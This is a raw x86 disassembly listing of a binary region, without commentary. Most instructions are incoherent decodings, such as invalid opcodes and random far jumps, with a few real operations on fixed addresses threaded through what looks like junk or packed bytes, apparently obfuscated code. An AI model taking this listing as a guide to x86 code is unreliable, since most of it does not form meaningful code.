  420bdc:	repnz popa 
  420bde:	mov    ebp,0x33b04431
  420be3:	into   
  420be4:	mov    gs,WORD PTR [ebx]
  420be6:	mov    ds:0x60d12de9,eax
  420beb:	or     BYTE PTR [ebp-0x28],ah
  420bee:	enter  0xb157,0x87
  420bf2:	shr    DWORD PTR [eax+edx*8+0x6b],1
  420bf6:	out    0x4a,al
  420bf8:	push   esi
  420bf9:	jb     0x420c58
  420bfb:	mov    ah,0xf6
  420bfd:	call   0x1e9f:0xa1543d3d
  420c04:	jl     0x420bf4
  420c06:	adc    al,0x42
  420c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c09:	jmp    0xa2a0ecc2
  420c0e:	aas    
  420c0f:	sbb    BYTE PTR [ebx],cl
  420c11:	sub    al,0xcf
  420c13:	mov    gs,WORD PTR [ebx+0x48]
  420c16:	shl    dh,0xa5
  420c19:	cmp    eax,0xef5ad7e2
  420c1e:	xor    BYTE PTR [edx-0x5d],0x8e
  420c22:	jmp    DWORD PTR [esi-0x63a10abd]
  420c28:	add    esi,ebx
  420c2a:	xor    ebp,DWORD PTR [ebp+0x1f]
  420c2d:	dec    ebx
  420c2e:	test   eax,0x82722c3c
  420c34:	pop    edi
  420c35:	jecxz  0x420c0e
  420c37:	cmp    DWORD PTR [ecx],ebp
  420c39:	fcom   QWORD PTR [ebp+0x72]
  420c3c:	retf   
  420c3d:	or     ebx,DWORD PTR [ebx-0x1b]
  420c40:	(bad)  
  420c42:	mov    bl,al
  420c44:	or     ch,BYTE PTR [ebx-0xf]
  420c47:	mov    al,ds:0xbcd8e59e
  420c4c:	cwde   
  420c4d:	in     al,0x1c
  420c4f:	scas   al,BYTE PTR es:[edi]
  420c50:	push   eax
  420c51:	add    eax,0xb3ec7749
  420c56:	dec    esi
  420c57:	test   dh,al
  420c59:	mov    ah,0xf1
  420c5b:	enter  0x5948,0xb4
  420c5f:	push   eax
  420c60:	mov    edx,esp
  420c62:	push   esp
  420c63:	mov    BYTE PTR [eax],bh
  420c65:	fisub  DWORD PTR [edi-0x5e]
  420c68:	xlat   BYTE PTR ds:[ebx]
  420c69:	push   esi
  420c6a:	loopne 0x420c94
  420c6c:	loope  0x420c03
  420c6e:	mov    ebx,0xb3593b0f
  420c73:	imul   BYTE PTR [ebp-0x76]
  420c76:	push   ecx
  420c77:	add    BYTE PTR [ecx-0x3d],ah
  420c7a:	push   eax
  420c7b:	dec    eax
  420c7c:	jmp    0x420c1c
  420c7e:	xor    dl,bl
  420c80:	mov    ?,WORD PTR [edx]
  420c82:	xor    edx,DWORD PTR [edi+0x7511888d]
  420c88:	add    BYTE PTR [eax],al
  420c8a:	mov    DWORD PTR [ebp-0x1c],eax
  420c8d:	jmp    0x420d5b
  420c92:	call   0xf00879a1
  420c97:	out    0xeb,eax
  420c99:	cs sti 
  420c9b:	inc    ebp
  420c9c:	ror    ebp,cl
  420c9e:	mov    al,0x77
  420ca0:	mov    ah,BYTE PTR [eax+0x72]
  420ca3:	jg     0x420ca6
  420ca5:	add    BYTE PTR [ecx+0x36000000],dh
  420cab:	xchg   DWORD PTR [eax+0x4b042375],edi
  420cb1:	fwait
  420cb2:	add    eax,0xcad494a2
  420cb7:	into   
  420cb8:	add    al,0xd5
  420cba:	push   edi
  420cbb:	mov    ecx,0x344f4f83
  420cc0:	pop    ebp
  420cc1:	xor    al,0xd
  420cc3:	push   esi
  420cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc5:	xchg   esp,eax
  420cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cc7:	das    
  420cc8:	mov    dh,0xb3
  420cca:	sar    bl,cl
  420ccc:	xor    bh,0x20
  420ccf:	lahf   
  420cd0:	xor    DWORD PTR [ebp+edx*4+0x75b2f86c],ebx
  420cd7:	out    dx,al
  420cd8:	jbe    0x420d01
  420cda:	xchg   edx,eax
  420cdb:	fidiv  DWORD PTR [esi-0x14]
  420cde:	call   0x7d09:0x9010f148
  420ce5:	(bad)  [eax-0x7c]
  420ce8:	lea    esi,[eax]
  420cea:	push   0x6581517d
  420cef:	add    ebx,DWORD PTR [esi-0x26]
  420cf2:	fnstsw WORD PTR [eax-0x1c7fa9ba]
  420cf8:	test   ah,dl
  420cfa:	jo     0x420c85
  420cfc:	test   DWORD PTR [edi+eax*4+0x6495ab50],ebx
  420d03:	(bad)  
  420d04:	and    al,0xfb
  420d06:	inc    edi
  420d07:	mov    ds:0x8430907f,eax
  420d0c:	(bad)  
  420d0d:	addr16 stc 
  420d0f:	idiv   DWORD PTR [eax+0xedaa4b5]
  420d15:	mov    dl,0xe0
  420d17:	push   ss
  420d18:	and    al,0x87
  420d1a:	inc    edx
  420d1b:	rcr    DWORD PTR [ebx],1
  420d1d:	(bad)  
  420d1e:	jo     0x420cae
  420d20:	and    bh,ah
  420d22:	mov    edx,0x10063cfd
  420d27:	add    dl,BYTE PTR [edi-0x22dbc5cb]
  420d2d:	ret    
  420d2e:	fwait
  420d2f:	popa   
  420d30:	or     BYTE PTR [ecx+0x5fdb782a],bl
  420d36:	cmp    al,bl
  420d38:	jmp    0x734b:0x8f116c95
  420d3f:	iret   
  420d40:	sbb    DWORD PTR ds:0x47794847,esp
  420d46:	cs push ebp
  420d48:	loope  0x420d83
  420d4a:	addr16 sahf 
  420d4c:	inc    esi
  420d4d:	adc    edi,ecx
  420d4f:	test   BYTE PTR [ecx],ch
  420d51:	sti    
  420d52:	cli    
  420d53:	sub    eax,0xd3a0ad50
  420d58:	pop    ebp
  420d59:	adc    al,0x1c
  420d5b:	shl    ecx,0x10
  420d5e:	jmp    0x420e2c
  420d63:	sub    al,0x4e
  420d65:	adc    BYTE PTR [edx+esi*2+0x7e],ch
  420d69:	jl     0x420db9
  420d6b:	cmp    al,0x9c
  420d6d:	push   0xbae2c49f
  420d72:	ret    
  420d73:	and    eax,DWORD PTR [eax+0xb10001]
  420d79:	add    BYTE PTR [eax],al
  420d7b:	sub    al,0x40
  420d7d:	fs (bad) 
  420d7f:	cmp    dl,BYTE PTR [ebp+0x4d]
  420d82:	jmp    0xe633:0x68744784
  420d89:	scas   al,BYTE PTR es:[edi]
  420d8a:	push   ebp
  420d8b:	adc    al,0x38
  420d8d:	loope  0x420d91
  420d8f:	pop    eax
  420d90:	nop
  420d91:	push   ecx
  420d92:	lahf   
  420d93:	mov    ds:0x2e903e2,eax
  420d98:	in     al,0xe5
  420d9a:	mov    ebx,0x2a0520d9
  420d9f:	in     eax,dx
  420da0:	popf   
  420da1:	jecxz  0x420d30
  420da3:	mov    WORD PTR [eax],gs
  420da5:	fdiv   DWORD PTR [edi-0x5903d5e]
  420dab:	std    
  420dac:	xchg   ebp,eax
  420dad:	into   
  420dae:	in     al,dx
  420daf:	outs   dx,BYTE PTR ds:[esi]
  420db0:	cdq    
  420db1:	jae    0x420d73
  420db3:	in     al,dx
  420db4:	dec    ebp
  420db5:	std    
  420db6:	les    esi,FWORD PTR [edx+edi*4]
  420db9:	shufps xmm6,XMMWORD PTR [ebp-0x6acee7e3],0x1b
  420dc1:	loop   0x420d5c
  420dc3:	bound  ecx,QWORD PTR [edx-0x51]
  420dc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dc7:	mov    dl,0xe9
  420dc9:	sahf   
  420dca:	mov    cl,0xdb
  420dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dcd:	jmp    0x583e:0xd8f72460
  420dd4:	pop    ss
  420dd5:	out    0x7b,eax
  420dd7:	or     BYTE PTR [eax],dh
  420dd9:	loopne 0x420db7
  420ddb:	xchg   ecx,eax
  420ddc:	sahf   
  420ddd:	(bad)  
  420ddf:	mov    al,0x96
  420de1:	int    0xe7
  420de3:	(bad)
  420de6:	fimul  DWORD PTR [eax]
  420de8:	test   al,0x31
  420dea:	stos   BYTE PTR es:[edi],al
  420deb:	das    
  420dec:	sbb    esp,edi
  420dee:	inc    esi
  420def:	dec    edi
  420df0:	dec    esp
  420df1:	and    al,0xe9
  420df3:	inc    ecx
  420df4:	mov    esi,0x782b1c07
  420df9:	call   FWORD PTR [ebx+0x7a]
  420dfc:	adc    ah,bh
  420dfe:	push   0xcf7f22f
  420e03:	in     al,dx
  420e04:	mov    al,ds:0xedd3b58b
  420e09:	(bad)  
  420e0a:	pop    ecx
  420e0b:	cs jle 0x420e84
  420e0e:	pop    ebp
  420e0f:	or     DWORD PTR ds:0x2ca6da9e,eax
  420e15:	lock add bl,BYTE PTR [edi]
  420e18:	inc    ebx
  420e19:	(bad)  
  420e1a:	mov    dl,0x4f
  420e1c:	xor    DWORD PTR [edx+0x75],eax
  420e1f:	mov    ch,0xea
  420e21:	sub    ah,BYTE PTR [eax]
  420e23:	(bad)  
  420e24:	sbb    ecx,esp
  420e26:	mov    BYTE PTR [esi],0xef
  420e29:	push   0x1105daf9
  420e2e:	jne    0x420e28
  420e30:	cmp    al,0xe9
  420e32:	leave  
  420e33:	add    BYTE PTR [eax],al
  420e35:	add    dh,dl
  420e37:	mov    cl,BYTE PTR [ebp-0x34]
  420e3a:	pop    ebp
  420e3b:	iret   
  420e3c:	xlat   BYTE PTR ds:[ebx]
  420e3d:	call   0x4ddd:0xa101bc1a
  420e44:	and    BYTE PTR [edi+0x180d4],bl
  420e4a:	mov    cl,0x0
  420e4c:	add    BYTE PTR [eax],al
  420e4e:	pop    edi
  420e4f:	sti    
  420e50:	xor    esp,DWORD PTR [ecx-0x40]
  420e53:	mov    edi,0xaf83b000
  420e58:	test   esi,edi
  420e5a:	int    0x52
  420e5c:	fidivr DWORD PTR [ebp+0x8e5a00b]
  420e62:	scas   al,BYTE PTR es:[edi]
  420e63:	mov    ds:0xe133485c,eax
  420e68:	ins    DWORD PTR es:[edi],dx
  420e69:	jo     0x420e41
  420e6b:	cmc    
  420e6c:	rcr    BYTE PTR [ebx+0x638f2503],cl
  420e72:	(bad)  
  420e73:	gs fs icebp 
  420e76:	pop    eax
  420e77:	sbb    BYTE PTR [esi],al
  420e79:	jg     0x420edc
  420e7b:	mov    WORD PTR [ecx+esi*2],fs
  420e7e:	int3   
  420e7f:	push   ebx
  420e80:	mov    cl,0x19
  420e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e83:	data16 rcr BYTE PTR [eax],0xa5
  420e87:	cmc    
  420e88:	out    dx,al
  420e89:	scas   al,BYTE PTR es:[edi]
  420e8a:	out    0x28,eax
  420e8c:	loope  0x420e1e
  420e8e:	test   DWORD PTR [ebp-0x64fe00e8],edx
  420e94:	sbb    eax,0x3550cfbd
  420e99:	inc    eax
  420e9a:	je     0x420eb6
  420e9c:	jbe    0x420e39
  420e9e:	inc    ecx
  420e9f:	jmp    0x420ebe
  420ea1:	push   es
  420ea2:	jp     0x420e64
  420ea4:	xor    al,0x5b
  420ea6:	popa   
  420ea7:	sub    bh,BYTE PTR [esi+0x15]
  420eaa:	(bad)  
  420eab:	sbb    ebx,DWORD PTR [edx]
  420ead:	cli    
  420eae:	hlt    
  420eaf:	pusha  
  420eb0:	in     al,0x38
  420eb2:	out    0xa,eax
  420eb4:	(bad)  
  420eb5:	jo     0x420e6c
  420eb7:	ret    0x7b8
  420eba:	stc    
  420ebb:	scas   eax,DWORD PTR es:[edi]
  420ebc:	cmp    al,0xda
  420ebe:	cmp    edx,DWORD PTR [edx-0x35]
  420ec1:	hlt    
  420ec2:	sbb    DWORD PTR [esi+0x49],edi
  420ec5:	fbld   TBYTE PTR ds:0xd16439a2
  420ecb:	(bad)  [eax+0x27]
  420ece:	push   cs
  420ecf:	jnp    0x420eec
  420ed1:	xlat   BYTE PTR ds:[ebx]
  420ed2:	or     eax,0x14cc935d
  420ed7:	mul    DWORD PTR [esi+esi*8+0x78205069]
  420ede:	and    eax,0x369f3f3
  420ee3:	lods   eax,DWORD PTR ds:[esi]
  420ee4:	jne    0x420f0b
  420ee6:	mov    bh,0x56
  420ee8:	xchg   esp,eax
  420ee9:	icebp  
  420eea:	push   ds
  420eeb:	mov    edi,0xe65e8c87
  420ef0:	jl     0x420edb
  420ef2:	cmp    BYTE PTR ds:0x33dd359,0x48
  420ef9:	mov    ecx,0xf0b99c39
  420efe:	push   eax
  420eff:	shr    eax,0x10
  420f02:	xor    DWORD PTR ds:0x4335c0,0x433640
  420f0c:	or     ecx,eax
  420f0e:	xor    ecx,0x78e259c9
  420f14:	add    DWORD PTR ds:0x433644,0x14b0
  420f1e:	add    ecx,ebx
  420f20:	mov    DWORD PTR ds:0x433550,0x21d1
  420f2a:	jmp    0x420ff8
  420f2f:	xchg   esi,eax
  420f30:	in     al,0x5e
  420f32:	addr16 jle 0x420f34
  420f35:	mov    edi,0x2074f8f5
  420f3a:	dec    esi
  420f3b:	leave  
  420f3c:	repz test DWORD PTR ss:[bx+di+0x1],eax
  420f43:	mov    cl,0x0
  420f45:	add    BYTE PTR [eax],al
  420f47:	sbb    dh,0x7e
  420f4a:	addr16 add al,0xba
  420f4d:	cwde   
  420f4e:	cmc    
  420f4f:	ret    0xeab1
  420f52:	imul   edx,DWORD PTR [esi+0x6c],0xffffffa3
  420f56:	jnp    0x420f34
  420f58:	pop    es
  420f59:	adc    al,0x48
  420f5b:	popa   
  420f5c:	mov    WORD PTR [ebx-0x7da57157],cs
  420f62:	call   DWORD PTR [ebp+0x1f]
  420f65:	mov    esi,0xa0081e74
  420f6a:	mov    ds:0x580f2e8a,eax
  420f6f:	(bad)  
  420f70:	pop    edi
  420f71:	xchg   edi,eax
  420f72:	aam    0xb1
  420f74:	sbb    DWORD PTR [esi],edi
  420f76:	jno    0x420fdb
  420f78:	mov    esp,0x35cbd67e
  420f7d:	aaa    
  420f7e:	mul    BYTE PTR [bx+si-0x32]
  420f82:	jno    0x420f2a
  420f84:	xchg   edi,eax
  420f85:	xor    ah,0xdc
  420f88:	enter  0x9c41,0x33
  420f8c:	in     eax,0xdb
  420f8e:	dec    edx
  420f8f:	mov    esi,0xaf2e02a7
  420f94:	xchg   esp,eax
  420f95:	mov    eax,ds:0xfa18f35a
  420f9a:	test   al,0x6e
  420f9c:	(bad)  
  420f9d:	xor    eax,0x4898637d
  420fa2:	fsubr  DWORD PTR [ebx+edi*8-0x282dbf09]
  420fa9:	push   0xf69702be
  420fae:	jg     0x420ff7
  420fb0:	push   ds
  420fb1:	jnp    0x420ff7
  420fb3:	es xor eax,0xc94d4bf8
  420fb9:	lahf   
  420fba:	jg     0x421004
  420fbc:	mov    ch,0x30
  420fbe:	push   es
  420fbf:	(bad)  
  420fc0:	cmc    
  420fc1:	scas   al,BYTE PTR es:[edi]
  420fc2:	sub    DWORD PTR ds:[edi-0x7c],esp
  420fc6:	mov    bl,0xfa
  420fc8:	xor    BYTE PTR [ebx+0x4b121e1f],0x26
  420fcf:	push   ss
  420fd0:	jo     0x420f76
  420fd2:	cmp    esi,DWORD PTR [edx+0x339078b9]
  420fd8:	sahf   
  420fd9:	xchg   edx,eax
  420fda:	xor    BYTE PTR [edx],cl
  420fdc:	pop    esi
  420fdd:	cmp    eax,0x96b9f20e
  420fe2:	add    esp,DWORD PTR [edi+edi*8+0x60f5ef90]
  420fe9:	pop    es
  420fea:	sti    
  420feb:	pop    esi
  420fec:	scas   eax,DWORD PTR es:[edi]
  420fed:	adc    dl,dh
  420fef:	int3   
  420ff0:	xchg   esp,eax
  420ff1:	mov    ch,0x74
  420ff3:	nop
  420ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ff5:	sub    eax,0xf981aba4
  420ffa:	inc    edx
  420ffb:	(bad)  
  420ffd:	dec    edx
  420ffe:	mov    DWORD PTR ds:0x4335b0,0x758f
  421008:	jmp    0x4210d6
  42100d:	lahf   
  42100e:	sbb    dh,BYTE PTR [esi-0x20014802]
  421014:	jnp    0x421020
  421016:	jbe    0x42103c
  421018:	fisub  DWORD PTR [esi]
  42101a:	add    al,0xd
  42101c:	lahf   
  42101d:	add    BYTE PTR ss:[ecx],0x0
  421021:	mov    cl,0x0
  421023:	add    BYTE PTR [eax],al
  421025:	cmp    eax,0xefec8ddc
  42102a:	leave  
  42102b:	cmp    al,dl
  42102d:	jmp    0xd000:0xad7cd426
  421034:	lds    edi,FWORD PTR [eax-0x5e9400fa]
  42103a:	fidiv  DWORD PTR [ecx-0x30c4a5d8]
  421040:	cld    
  421041:	test   eax,0x25493d91
  421046:	mov    edi,0xc6d3e44f
  42104b:	enter  0xfb18,0xb
  42104f:	repz pop ebx
  421051:	lods   eax,DWORD PTR ds:[esi]
  421052:	jge    0x42106f
  421054:	pushf  
  421055:	fdiv   QWORD PTR [ecx-0x5793e637]
  42105b:	rcr    DWORD PTR [ecx-0x72],0x31
  42105f:	popf   
  421060:	xchg   esp,eax
  421061:	sub    dh,BYTE PTR [edx]
  421063:	and    al,BYTE PTR [esi-0x5d]
  421066:	sbb    DWORD PTR [edx+0x61],ebx
  421069:	mov    bh,0xde
  42106b:	jmp    0x314a5590
  421070:	cwde   
  421071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421072:	push   esi
  421073:	xor    eax,ebp
  421075:	in     al,0xc9
  421077:	mov    bl,0xdc
  421079:	int3   
  42107a:	push   ds
  42107b:	cmp    edi,DWORD PTR [esi]
  42107d:	sub    BYTE PTR [edi+0x7a],cl
  421080:	ins    BYTE PTR es:[edi],dx
  421081:	mov    ah,0x21
  421083:	mov    bh,0xd
  421085:	sahf   
  421086:	sbb    al,0x92
  421088:	shr    BYTE PTR [ecx],0x3c
  42108b:	push   ecx
  42108c:	add    al,BYTE PTR [eax-0x2d]
  42108f:	and    esi,DWORD PTR [esi-0x58658220]
  421095:	mov    ch,bh
  421097:	fst    QWORD PTR [edx]
  421099:	aas    
  42109a:	mov    esi,0xbcdb7783
  42109f:	sbb    esi,DWORD PTR [ecx-0x69]
  4210a2:	sub    BYTE PTR [ebx+0x75],cl
  4210a5:	fwait
  4210a6:	ret    
  4210a7:	cmp    esi,DWORD PTR [edx+0x7e61fe00]
  4210ad:	dec    edx
  4210ae:	outs   dx,BYTE PTR ds:[esi]
  4210af:	lods   al,BYTE PTR ds:[esi]
  4210b0:	enter  0x9bff,0xde
  4210b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210b5:	jmp    0x2b6b6a6c
  4210ba:	adc    dh,cl
  4210bc:	rcl    DWORD PTR [ebp-0x41cb22dd],cl
  4210c2:	in     al,dx
  4210c3:	add    BYTE PTR [ecx+eax*2+0x48],0xe8
  4210c8:	outs   dx,DWORD PTR ds:[esi]
  4210c9:	push   ds
  4210ca:	and    ah,ah
  4210cc:	repnz and eax,0xcde418be
  4210d2:	(bad)
  4210d6:	je     0x423cce
  4210dc:	mov    eax,DWORD PTR [ebp-0x10]
  4210df:	and    DWORD PTR ds:0x433580,0x672e
  4210e9:	jmp    0x4211b7
  4210ee:	mov    WORD PTR [ebx+esi*4-0x36],?
  4210f2:	repz iret 
  4210f4:	std    
  4210f5:	jle    0x4210f8
  4210f7:	dec    edi
  4210f8:	and    BYTE PTR [edx+0x74e70d55],dl
  4210fe:	out    0x82,eax
  421100:	add    DWORD PTR [eax],eax
  421102:	mov    cl,0x0
  421104:	add    BYTE PTR [eax],al
  421106:	sub    bh,BYTE PTR [esi]
  421108:	aad    0xbf
  42110a:	lds    eax,FWORD PTR [eax+0xd]
  42110d:	fistp  WORD PTR [esi]
  42110f:	fstp   TBYTE PTR [ebx-0x22]
  421112:	cwde   
  421113:	sub    al,0xbb
  421115:	add    BYTE PTR [edi-0x61],0x11
  421119:	dec    ecx
  42111a:	(bad)  
  42111b:	rcr    BYTE PTR [esi],0x36
  42111e:	rcl    DWORD PTR [esi-0x6a825084],cl
  421124:	int    0x75
  421126:	dec    edx
  421127:	in     eax,0x42
  421129:	test   eax,0xbacfd206
  42112e:	jno    0x4210b0
  421130:	cmp    al,0x8b
  421132:	sbb    dh,BYTE PTR [ebx-0x73]
  421135:	pop    eax
  421136:	xor    edi,DWORD PTR [edx-0x3d]
  421139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42113a:	hlt    
  42113b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42113c:	jne    0x4210d7
  42113e:	push   0x984b4628
  421143:	sub    eax,DWORD PTR [edx-0x401c8ea2]
  421149:	xchg   esi,eax
  42114a:	jle    0x4211c8
  42114c:	push   ss
  42114d:	mov    dh,0x68
  42114f:	sbb    eax,0xc26525ad
  421154:	mov    eax,ds:0xc3e3d966
  421159:	xchg   ebx,eax
  42115a:	jno    0x42114a
  42115c:	jbe    0x4210f4
  42115e:	ret    
  42115f:	shl    BYTE PTR [esi+0x16],cl
  421162:	sbb    ah,bh
  421164:	xor    ebx,ecx
  421166:	lods   eax,DWORD PTR ds:[esi]
  421167:	mov    dl,BYTE PTR [ebp-0x5f]
  42116a:	dec    esp
  42116b:	lock popa 
  42116d:	inc    esi
  42116e:	mov    ds:0x678f1ceb,al
  421173:	push   edx
  421174:	fwait
  421175:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421176:	dec    edx
  421177:	imul   ecx,DWORD PTR ds:0x9be3a8a2,0xd0cc4443
  421181:	sub    ebx,edi
  421183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421184:	push   ecx
  421185:	mov    cl,0x30
  421187:	dec    edi
  421188:	cdq    
  421189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118a:	es xor ch,al
  42118d:	icebp  
  42118e:	adc    al,0xd9
  421190:	jg     0x4211b2
  421192:	stos   DWORD PTR es:[edi],eax
  421193:	and    BYTE PTR [edi],cl
  421195:	lds    esi,FWORD PTR [eax-0xc]
  421198:	pusha  
  421199:	leave  
  42119a:	mov    cl,0xe3
  42119c:	sbb    DWORD PTR [ecx],esi
  42119e:	pop    ss
  42119f:	fmul   DWORD PTR [esi-0x6b]
  4211a2:	add    cl,BYTE PTR [edx-0x448c6eab]
  4211a8:	stos   DWORD PTR es:[edi],eax
  4211a9:	mov    bl,0xc5
  4211ab:	rsqrtps xmm3,XMMWORD PTR [ecx-0x2fe59895]
  4211b2:	rcl    BYTE PTR [ebp+0x29],0x85
  4211b6:	add    al,bh
  4211b8:	inc    ebp
  4211b9:	in     al,dx
  4211ba:	js     0x4211f7
  4211bc:	add    BYTE PTR [eax],al
  4211be:	cmp    DWORD PTR ds:0x433610,0x0
  4211c5:	ja     0x4212c2
  4211cb:	jmp    0x4212c2
  4211d0:	push   0x7185
  4211d5:	push   DWORD PTR [ebp-0x18]
  4211d8:	push   0x42ec72
  4211dd:	push   0x3b09
  4211e2:	push   DWORD PTR [ebp-0x10]
  4211e5:	push   DWORD PTR [ebp-0x28]
  4211e8:	push   DWORD PTR [ebp-0x28]
  4211eb:	push   DWORD PTR [ebp-0xc]
  4211ee:	call   DWORD PTR ds:0x43c830
  4211f4:	jmp    0x4212c2
  4211f9:	mov    al,ds:0xfb52d1da
  4211fe:	pop    ebx
  4211ff:	mov    ds:0xb11598fa,eax
  421204:	in     al,0x0
  421206:	xchg   ebx,eax
  421207:	mov    bl,0xe4
  421209:	cwde   
  42120a:	add    DWORD PTR [ecx],0x0
  42120d:	mov    cl,0x0
  42120f:	add    BYTE PTR [eax],al
  421211:	fisub  WORD PTR [esi]
  421213:	sbb    BYTE PTR [ebx-0x260083d2],0x34
  42121a:	(bad)  
  42121b:	inc    ebx
  42121c:	push   0x4b
  42121e:	jno    0x421253
  421220:	ja     0x4211b7
  421222:	and    DWORD PTR [edx-0x7f],ebp
  421225:	cmp    ecx,DWORD PTR [edi-0x74f283d0]
  42122b:	add    al,0x61
  42122d:	cmp    eax,ebp
  42122f:	jmp    0x421299
  421231:	push   0xfaef5559
  421236:	(bad)  
  421237:	dec    eax
  421238:	clc    
  421239:	xchg   esi,eax
  42123a:	xchg   ebp,eax
  42123b:	je     0x421220
  42123d:	cld    
  42123e:	sahf   
  42123f:	push   ebx
  421240:	jbe    0x421241
  421242:	cli    
  421243:	ins    DWORD PTR es:[edi],dx
  421244:	es pop ss
  421246:	and    eax,0xf01197e9
  42124b:	fwait
  42124c:	ror    edx,0xfe
  42124f:	ja     0x4212b4
  421251:	lods   al,BYTE PTR ds:[esi]
  421252:	cmc    
  421253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421254:	xor    al,0x16
  421256:	cmp    al,0xe
  421258:	arpl   WORD PTR [ebp-0x3a],sp
  42125b:	mov    ecx,0x92634be8
  421260:	(bad)  
  421262:	sar    BYTE PTR [esi+0x7d8a5d6e],0x22
  421269:	and    BYTE PTR [ebx+eiz*4-0x44],0x54
  42126e:	inc    ebp
  42126f:	(bad)  
  421270:	(bad)  
  421271:	sbb    al,0xfc
  421273:	jl     0x421222
  421275:	jmp    0x951a:0xfa300aef
  42127c:	loopne 0x4212e6
  42127e:	jp     0x421207
  421280:	pop    ecx
  421281:	xchg   ebp,eax
  421282:	(bad)  
  421283:	fdivr  QWORD PTR [ebx-0x2c407019]
  421289:	sti    
  42128a:	mov    eax,0x5afa3959
  42128f:	mov    WORD PTR [ebx+0x77],gs
  421292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421293:	fucomi st,st(7)
  421295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421296:	mov    edi,0xeb5415cd
  42129b:	jae    0x42125a
  42129d:	pushf  
  42129e:	das    
  42129f:	pop    esi
  4212a0:	js     0x421276
  4212a2:	icebp  
  4212a3:	mov    cl,0xd6
  4212a5:	cmp    esi,edi
  4212a7:	int    0x94
  4212a9:	push   edx
  4212aa:	fwait
  4212ab:	sbb    eax,0xa99ef583
  4212b0:	sbb    DWORD PTR [ecx],edx
  4212b2:	loope  0x42130e
  4212b4:	mov    esp,0xabe56b90
  4212b9:	ret    0xff66
  4212bc:	int    0x7f
  4212be:	imul   edi,DWORD PTR [edx+edx*8-0x2fba76ce],0x4bf045c7
  4212c9:	or     al,BYTE PTR [eax]
  4212cb:	add    BYTE PTR [ebx-0x36160fbb],cl
  4212d1:	add    BYTE PTR [eax],al
  4212d3:	add    ah,dh
  4212d5:	int3   
  4212d6:	stc    
  4212d7:	retf   
  4212d8:	stc    
  4212d9:	push   esi
  4212db:	(bad)  
  4212dc:	jns    0x421338
  4212de:	dec    esi
  4212df:	xor    ecx,DWORD PTR [edx+0x49954d47]
  4212e5:	test   BYTE PTR [ecx],al
  4212e7:	add    BYTE PTR [ecx-0x7b000000],dh
  4212ed:	je     0x4212e0
  4212ef:	or     al,0x5b
  4212f1:	xchg   ebx,eax
  4212f2:	mov    esi,0x1e58a991
  4212f7:	cwde   
  4212f8:	xchg   BYTE PTR [ecx-0x1c2c385c],ch
  4212fe:	add    al,0xbe
  421300:	pop    esp
  421301:	jae    0x42131f
  421303:	cld    
  421304:	pop    eax
  421305:	cmp    edx,DWORD PTR [ebx+ebx*1-0x44]
  421309:	(bad)  
  42130a:	cmp    eax,0x7f330ae
  42130f:	dec    esi
  421310:	cmp    BYTE PTR [ecx],0x2
  421313:	or     al,0xd
  421315:	(bad)  
  421316:	cmp    DWORD PTR [eax],edi
  421318:	fwait
  421319:	dec    edi
  42131a:	cmp    BYTE PTR [ebx],dh
  42131c:	test   DWORD PTR [ecx],0x9ef123fd
  421322:	fldl2e 
  421324:	or     ebp,0x60
  421327:	jle    0x421334
  421329:	sub    eax,0x6641ad89
  42132e:	jnp    0x421386
  421330:	jmp    0x421396
  421332:	xor    ebp,eax
  421334:	lock pop ebp
  421336:	imul   eax,DWORD PTR [edi],0x47736f47
  42133c:	push   ds
  42133d:	sbb    esi,edi
  42133f:	or     al,0xcf
  421341:	push   ebx
  421342:	outs   dx,BYTE PTR ds:[esi]
  421343:	xlat   BYTE PTR ds:[ebx]
  421344:	imul   ecx,DWORD PTR [eax+0x1b],0x1f
  421348:	xor    eax,0xa76d430a
  42134d:	adc    eax,0x1f21262e
  421352:	adc    edi,DWORD PTR [esi+0xa]
  421355:	sub    ch,cl
  421357:	mov    gs,WORD PTR [edi-0x10]
  42135a:	add    ah,ah
  42135c:	popf   
  42135d:	es pop es
  42135f:	xchg   edi,eax
  421360:	stos   DWORD PTR es:[edi],eax
  421361:	and    DWORD PTR [esi-0x4b657b3a],edi
  421367:	jnp    0x421314
  421369:	shl    BYTE PTR [eax+0x31bc3360],cl
  42136f:	mov    ebx,0x6a8ccf0c
  421374:	fstp   QWORD PTR [esi-0x73]
  421377:	adc    esp,edi
  421379:	bound  edi,QWORD PTR [esp+eax*1]
  42137c:	xchg   edi,eax
  42137d:	adc    edi,edx
  42137f:	fucom  st(4)
  421381:	push   ebx
  421382:	inc    edi
  421383:	data16 add cl,BYTE PTR [ecx]
  421386:	sti    
  421387:	xor    BYTE PTR [eax],dh
  421389:	mov    edi,0x5f7330d5
  42138e:	out    0x47,eax
  421390:	push   ss
  421391:	mov    bl,0x38
  421393:	mov    edx,0xf91b2f83
  421398:	inc    edi
  421399:	lods   al,BYTE PTR ds:[esi]
  42139a:	mov    edi,0x4d8b5248
  42139f:	in     al,dx
  4213a0:	jmp    0x42146e
  4213a5:	jg     0x421331
  4213a7:	xchg   ecx,eax
  4213a8:	jle    0x42139f
  4213aa:	jg     0x4213ab
  4213ac:	mov    edx,DWORD PTR [edi+eax*8+0x572f65c0]
  4213b3:	aad    0x95
  4213b5:	cli    
  4213b6:	test   BYTE PTR [ecx],al
  4213b8:	add    BYTE PTR [ecx-0x2b000000],dh
  4213be:	in     al,0x94
  4213c0:	xor    dl,BYTE PTR [edi+0x44]
  4213c3:	mov    dh,0xdd
  4213c5:	sbb    ecx,DWORD PTR [ebp-0x1efc03b4]
  4213cb:	int    0x24
  4213cd:	mov    eax,0xab5e0a24
